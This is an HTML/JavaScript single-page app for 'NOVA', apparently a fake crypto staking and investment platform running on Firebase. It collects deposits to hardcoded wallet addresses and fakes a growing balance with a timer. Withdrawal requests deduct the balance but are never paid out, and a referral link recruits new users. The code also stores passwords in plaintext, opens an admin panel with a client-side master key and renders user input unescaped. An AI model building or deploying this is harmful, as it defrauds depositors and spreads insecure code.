<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Elite Asset Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --gold: #D4AF37; --bg: #030303; }
        body { 
            background: var(--bg); color: white; font-family: 'Plus Jakarta Sans', sans-serif;
            background-image: radial-gradient(circle at 50% -20%, #1a1a10 0%, #030303 80%);
            overflow-x: hidden;
        }
        .neo-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border: 1px solid rgba(212, 175, 55, 0.15); border-radius: 28px; }
        .gold-text { background: linear-gradient(135deg, #FFF5D1 0%, #D4AF37 50%, #A67C00 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .btn-elite { background: linear-gradient(135deg, #D4AF37, #F2CC60); transition: 0.3s; box-shadow: 0 10px 20px rgba(212, 175, 55, 0.1); }
        .btn-elite:active { transform: scale(0.96); }
        .nova-input { background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); outline: none; transition: 0.3s; }
        .nova-input:focus { border-color: var(--gold); background: rgba(255, 255, 255, 0.05); }
        .nav-float { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 400px; background: rgba(10, 10, 10, 0.8); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 25px; padding: 12px; z-index: 1000; }
        .screen { display: none; opacity: 0; transform: translateY(15px); }
        .active-screen { display: block; opacity: 1; transform: translateY(0); transition: 0.4s ease-out; }
    </style>
</head>
<body>

    <div id="auth-screen" class="min-h-screen flex flex-col items-center justify-center p-8 active-screen">
        <div class="text-center mb-10">
            <h1 onclick="handleTaps()" class="text-6xl font-black tracking-tighter gold-text">NOVA</h1>
            <p class="text-[8px] tracking-[6px] text-gray-500 uppercase mt-2">Global Institutional Network</p>
        </div>
        <div class="neo-card p-8 w-full max-w-sm">
            <input type="text" id="u-email" placeholder="Terminal ID" class="nova-input w-full p-4 rounded-xl mb-3 text-sm">
            <input type="password" id="u-pass" placeholder="Passkey" class="nova-input w-full p-4 rounded-xl mb-3 text-sm">
            <input type="text" id="adm-key" placeholder="Master Key" class="hidden nova-input w-full p-4 border-[#D4AF37] rounded-xl mb-3 text-sm">
            <button onclick="auth()" class="btn-elite w-full p-4 rounded-xl text-black font-black text-xs tracking-widest uppercase">Initiate Terminal</button>
            <p onclick="toggleM()" id="m-text" class="text-center text-[9px] mt-6 text-gray-600 uppercase tracking-widest cursor-pointer">Request Access</p>
        </div>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-black z-[9999] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="gold-text font-black">COMMAND CENTER</h2><button onclick="location.reload()" class="text-red-500">EXIT</button></div>
        <div id="adm-list" class="space-y-4"></div>
    </div>

    <div id="app" class="hidden pb-32">
        <header class="p-6 flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 neo-card flex items-center justify-center text-[#D4AF37] font-black" id="avatar">N</div>
                <h2 id="user-id-txt" class="font-bold text-sm uppercase">USER</h2>
            </div>
            <div class="text-[10px] text-green-500 bg-green-500/10 px-3 py-1 rounded-full font-bold">SECURE</div>
        </header>

        <div id="dash-screen" class="screen active-screen p-6">
            <div class="neo-card p-8 mb-6 relative overflow-hidden">
                <p class="text-[9px] text-gray-500 font-bold tracking-widest mb-1">AVAILABLE LIQUIDITY</p>
                <h1 id="main-bal" class="text-5xl font-black tracking-tighter mb-4">$0.00</h1>
                <div class="flex gap-4">
                    <div class="flex-1"><p class="text-[8px] text-gray-600">YIELD</p><p id="v-daily" class="text-green-400 font-bold">+$0.00</p></div>
                    <div class="flex-1 text-right"><p class="text-[8px] text-gray-600">ASSET</p><p class="text-white font-bold">USDT</p></div>
                </div>
            </div>

            <div class="neo-card p-6 mb-6">
                <div class="flex gap-2 p-1 bg-black/40 rounded-xl mb-6 border border-white/5">
                    <button onclick="switchTab('dep-box', this)" class="tab-btn flex-1 py-2 rounded-lg text-[9px] font-black bg-[#D4AF37] text-black">DEPOSIT</button>
                    <button onclick="switchTab('wd-box', this)" class="tab-btn flex-1 py-2 rounded-lg text-[9px] font-black text-gray-500">WITHDRAW</button>
                </div>

                <div id="dep-box" class="tab-content">
                    <div class="space-y-2 mb-4 text-[9px]">
                        <div class="flex justify-between bg-white/5 p-3 rounded-lg"><span>TRUST (BEP20)</span><span onclick="copyAddr('0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37',this)" class="text-[#D4AF37] cursor-pointer">COPY</span></div>
                        <div class="flex justify-between bg-white/5 p-3 rounded-lg"><span>META (ERC20)</span><span onclick="copyAddr('0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2',this)" class="text-[#D4AF37] cursor-pointer">COPY</span></div>
                    </div>
                    <input type="number" id="dep-amt" placeholder="Amount ($)" class="nova-input w-full p-3 rounded-xl mb-2 text-sm text-center">
                    <input type="text" id="dep-tid" placeholder="Transaction ID (TID)" class="nova-input w-full p-3 rounded-xl mb-2 text-sm text-center">
                    <input type="file" id="proof-img" class="hidden" onchange="processImg(this)">
                    <button onclick="document.getElementById('proof-img').click()" class="w-full py-2 mb-2 text-[8px] text-gray-500 border border-dashed border-gray-700 rounded-lg">ATTACH SCREENSHOT</button>
                    <button onclick="requestFin('Deposit')" class="btn-elite w-full p-3 rounded-xl text-black font-black text-[10px]">SUBMIT DEPOSIT</button>
                </div>

                <div id="wd-box" class="tab-content hidden">
                    <input type="number" id="wd-amt" placeholder="Amount ($)" class="nova-input w-full p-3 rounded-xl mb-2 text-sm text-center">
                    <select id="wd-method" class="nova-input w-full p-3 rounded-xl mb-2 text-xs bg-black text-gray-400">
                        <option value="Trust Wallet (BEP20)">Trust Wallet (BEP20)</option>
                        <option value="MetaMask (ERC20)">MetaMask (ERC20)</option>
                        <option value="Binance (TRC20)">Binance (TRC20)</option>
                    </select>
                    <input type="text" id="wd-addr" placeholder="Receiving Address" class="nova-input w-full p-3 rounded-xl mb-2 text-xs text-center">
                    <button onclick="requestFin('Withdrawal')" class="w-full p-3 bg-white text-black font-black rounded-xl text-[10px]">INITIATE PAYOUT</button>
                </div>
            </div>

            <h3 class="text-[10px] font-black text-gray-600 mb-3 tracking-widest">STAKING PROTOCOLS</h3>
            <div class="grid grid-cols-2 gap-3 mb-6">
                <div class="neo-card p-4">
                    <p class="text-[8px] text-gray-500">Tier 1</p><p class="font-black text-lg">$30</p>
                    <button onclick="buyNode(30, 1.5)" class="w-full mt-2 py-1 bg-white/5 border border-white/5 rounded text-[8px] font-bold">ACTIVATE</button>
                </div>
                <div class="neo-card p-4 border-[#D4AF37]/40">
                    <p class="text-[8px] text-gray-500">Tier 2</p><p class="font-black text-lg gold-text">$100</p>
                    <button onclick="buyNode(100, 6.0)" class="w-full mt-2 py-1 bg-white/5 border border-white/5 rounded text-[8px] font-bold">ACTIVATE</button>
                </div>
            </div>

            <h3 class="text-[10px] font-black text-gray-600 mb-3 tracking-widest">HISTORY</h3>
            <div id="hist-list" class="space-y-3"></div>
        </div>

        <div id="office-screen" class="screen p-6">
            <div class="neo-card p-6 mb-6">
                <p class="text-[10px] text-gray-500 mb-2">Referral Protocol Link</p>
                <p id="ref-link" class="text-[9px] text-[#D4AF37] break-all p-3 bg-black rounded-lg border border-white/5"></p>
            </div>
            <button class="w-full neo-card p-5 flex justify-between items-center"><span class="text-xs font-bold">WhatsApp Support</span><i class="fa-brands fa-whatsapp text-green-500"></i></button>
        </div>

        <nav class="nav-float flex justify-around items-center">
            <i onclick="nav('dash-screen')" class="fa-solid fa-house text-[#D4AF37]"></i>
            <div onclick="nav('dash-screen')" class="w-10 h-10 bg-[#D4AF37] rounded-full flex items-center justify-center -mt-10 border-4 border-[#030303] shadow-lg"><i class="fa-solid fa-plus text-black"></i></div>
            <i onclick="nav('office-screen')" class="fa-solid fa-users text-gray-500"></i>
        </nav>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);
        let activeUser = null; let base64Img = ""; window.taps = 0; window.isLogin = true;

        window.handleTaps = () => { taps++; if(taps >= 6) document.getElementById('adm-key').classList.remove('hidden'); };
        window.toggleM = () => { isLogin = !isLogin; document.getElementById('m-text').innerText = isLogin ? "Request Access" : "Secure Login"; };

        window.auth = async () => {
            const id = document.getElementById('u-email').value.toLowerCase().trim();
            const pw = document.getElementById('u-pass').value;
            if(document.getElementById('adm-key').value === "nov786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); return; }
            if(!id || !pw) return alert("Missing Creds");
            const uRef = doc(db, "users", id); const snap = await getDoc(uRef);
            if(!isLogin) {
                if(snap.exists()) return alert("Registered");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, time: Date.now() }); start(id);
            } else {
                if(snap.exists() && snap.data().password === pw) start(id);
                else alert("Failed");
            }
        };

        function start(id) {
            activeUser = id; document.getElementById('auth-screen').classList.remove('active-screen');
            setTimeout(() => { document.getElementById('auth-screen').classList.add('hidden'); document.getElementById('app').classList.remove('hidden'); }, 400);
            document.getElementById('user-id-txt').innerText = id; document.getElementById('ref-link').innerText = window.location.href + "?ref=" + id;
            onSnapshot(doc(db, "users", id), d => {
                document.getElementById('main-bal').innerText = "$" + (d.data().balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "+$" + (d.data().daily || 0).toFixed(2);
            });
            loadHistory();
            setInterval(() => { let el = document.getElementById('main-bal'); let val = parseFloat(el.innerText.replace('$','')); el.innerText = "$" + (val + 0.0001).toFixed(4); }, 3000);
        }

        window.processImg = (el) => { const reader = new FileReader(); reader.onload = () => base64Img = reader.result; reader.readAsDataURL(el.files[0]); };

        window.requestFin = async (type) => {
            const amt = parseFloat(document.getElementById(type === 'Deposit' ? 'dep-amt' : 'wd-amt').value);
            const uRef = doc(db, "users", activeUser); const snap = await getDoc(uRef);
            if(type === 'Withdrawal') {
                const method = document.getElementById('wd-method').value; const addr = document.getElementById('wd-addr').value;
                if(!amt || !addr || snap.data().balance < amt) return alert("Error");
                await addDoc(collection(db, "logs"), { user: activeUser, amount: amt, type, method, addr, status: 'Pending', time: Date.now() });
                await updateDoc(uRef, { balance: snap.data().balance - amt });
            } else {
                const tid = document.getElementById('dep-tid').value;
                if(!amt || !tid) return alert("Missing Info");
                await addDoc(collection(db, "logs"), { user: activeUser, amount: amt, type, tid, status: 'Pending', proof: base64Img, time: Date.now() });
            }
            alert("Sent!"); base64Img = "";
        };

        window.buyNode = async (p, d) => {
            const r = doc(db, "users", activeUser); const s = await getDoc(r);
            if(s.data().balance < p) return alert("Liquidity Error");
            await updateDoc(r, { balance: s.data().balance - p, daily: (s.data().daily || 0) + d });
            alert("Node Active!");
        };

        function loadHistory() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", activeUser)), s => {
                const h = document.getElementById('hist-list'); h.innerHTML = "";
                let arr = []; s.forEach(d => arr.push(d.data()));
                arr.sort((a,b) => b.time - a.time).forEach(t => {
                    h.innerHTML += `<div class="neo-card p-4 flex justify-between items-center text-[9px]">
                        <div><p class="font-black uppercase">${t.type}</p><p class="text-gray-600">${new Date(t.time).toLocaleTimeString()}</p></div>
                        <div class="text-right"><p class="font-black">$${t.amount.toFixed(2)}</p><p class="${t.status=='Pending'?'text-yellow-600':'text-green-600'} font-bold">${t.status}</p></div>
                    </div>`;
                });
            });
        }

        function loadAdmin() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const al = document.getElementById('adm-list'); al.innerHTML = "";
                s.forEach(d => {
                    const r = d.data(); const isWD = r.type === 'Withdrawal';
                    al.innerHTML += `<div class="neo-card p-5 border-l-4 ${isWD ? 'border-red-500' : 'border-green-500'}">
                        <div class="flex justify-between mb-2"><span class="text-[10px] font-bold text-gray-400">${r.user}</span><span class="font-black">$${r.amount}</span></div>
                        <div class="text-[8px] bg-black/40 p-2 rounded mb-3">
                            <p>TYPE: ${r.type} | METHOD: ${r.method || 'N/A'}</p>
                            ${isWD ? `<p class="text-orange-400">ADDR: ${r.addr}</p>` : `<p class="text-blue-400">TID: ${r.tid}</p>`}
                        </div>
                        ${!isWD && r.proof ? `<button onclick="window.open('${r.proof}')" class="w-full py-1 mb-2 bg-white/5 rounded text-[8px]">VIEW PROOF</button>` : ''}
                        <button onclick="approve('${d.id}','${r.user}',${r.amount},'${r.type}')" class="w-full bg-[#D4AF37] text-black font-black p-2 rounded-lg text-[9px]">APPROVE</button>
                    </div>`;
                });
            });
        }

        window.approve = async (id, u, a, t) => {
            const uR = doc(db, "users", u); const us = await getDoc(uR);
            if(t === 'Deposit') await updateDoc(uR, { balance: us.data().balance + a });
            await updateDoc(doc(db, "logs", id), { status: 'Verified' });
        };

        window.copyAddr = (a, b) => { navigator.clipboard.writeText(a); b.innerText = "COPIED"; setTimeout(() => b.innerText = "COPY", 2000); };
        window.switchTab = (id, btn) => {
            document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden')); document.getElementById(id).classList.remove('hidden');
            document.querySelectorAll('.tab-btn').forEach(b => { b.classList.remove('bg-[#D4AF37]', 'text-black'); b.classList.add('text-gray-500'); });
            btn.classList.add('bg-[#D4AF37]', 'text-black'); btn.classList.remove('text-gray-500');
        };
        window.nav = (id) => { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen')); setTimeout(() => { document.querySelectorAll('.screen').forEach(s => s.style.display = 'none'); document.getElementById(id).style.display = 'block'; setTimeout(() => document.getElementById(id).classList.add('active-screen'), 50); }, 300); };
        window.logout = () => location.reload();
    </script>
</body>
</html>
